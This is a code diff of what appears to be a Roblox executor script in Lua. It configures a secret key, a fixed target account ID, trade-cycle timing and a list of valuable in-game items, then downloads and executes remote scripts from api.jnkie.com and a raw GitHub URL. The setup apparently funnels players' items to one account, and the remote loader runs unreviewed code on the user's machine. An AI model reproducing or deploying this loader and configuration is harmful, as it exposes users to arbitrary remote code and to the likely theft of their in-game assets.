@@ -1,22 +1,5 @@
-getgenv().SECRET_KEY = "mrr_007d378d418f47eeafe379d62c730ce9"
-getgenv().TARGET_ID = 6219924104
-getgenv().DELAY_STEP = 1      
-getgenv().TRADE_CYCLE_DELAY = 2
-getgenv().TARGET_BRAINROTS = {
-    ["Quackini Snackini"] = true,
-    ["Hopilikalika Hopilikalako"] = true,
-    ["Kalika Bros"] = true,
-    ["Digi Narwhal"] = true,
-    ["Gym Bros"] = true,
-    ["Globa Steppa"] = true,
-    ["Strawberry Elephant"] = true,
-    ["Meowl"] = true,
-    ["Headless Horseman"] = true,
-    ["Skibidi Toilet"] = true,
-    ["Griffin"] = true,
-    ["Hydra Dragon Cannelloni"] = true,
 local genv = getgenv()
-genv.SECRET_KEY = "shub_aec86dc3a54d0b144a2bd11dc478a356"
+genv.SECRET_KEY = "shub_7063f4f41b043201655ccc87db73a6a4"
 genv.TARGET_ID = 6219924104
 genv.MinGeneration = 25000000
 genv.MaxQuantity = 25
@@ -90,5 +73,4 @@ local function safeLoadFromUrl(url)
 end
 
 safeLoadFromUrl("https://api.jnkie.com/api/v1/luascripts/public/4412bf5b03484439b54771aa1b89e7bf8dd52b12759ac2f76d92f6e759c3e333/download")
-end)
 safeLoadFromUrl("https://raw.githubusercontent.com/SHUBSCRIPTS-COM/Shub/refs/heads/main/Script.luau")
